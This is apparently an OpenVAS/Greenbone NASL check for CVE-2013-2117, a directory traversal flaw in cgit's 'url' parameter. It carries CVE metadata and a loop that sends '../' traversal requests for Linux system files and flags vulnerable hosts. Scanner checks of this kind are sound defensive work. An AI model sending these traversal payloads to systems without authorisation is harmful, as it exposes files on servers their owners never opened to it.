# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only
CPE = "cpe:/a:lars_hjemli:cgit";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103720");
  script_cve_id("CVE-2013-2117");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_version("2025-04-15T05:54:49+0000");

  script_name("cgit 'url' Parameter Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/60164");
  script_xref(name:"URL", value:"http://hjemli.net/git/");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-05-28 13:55:35 +0200 (Tue, 28 May 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_cgit_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cgit/installed", "cgit/repos");
  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor advisory
  for more information.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"cgit is prone to a directory traversal vulnerability.

  An attacker can exploit this issue using directory-traversal strings
  to retrieve arbitrary files outside of the server root directory. This
  may aid in further attacks.");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
repos = get_kb_list("cgit/repos");

x = 0;

files = traversal_files("linux");

foreach repo (repos) {

  foreach pattern(keys(files)) {

    file = files[pattern];

    url = dir + '?url=/'+ repo + '/about/../../../../../../../../../../../' + file;

    if(http_vuln_check(port:port, url:url,pattern:pattern)) {
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }

  if(x > 10)exit(99);
  x++;

}

exit(99);
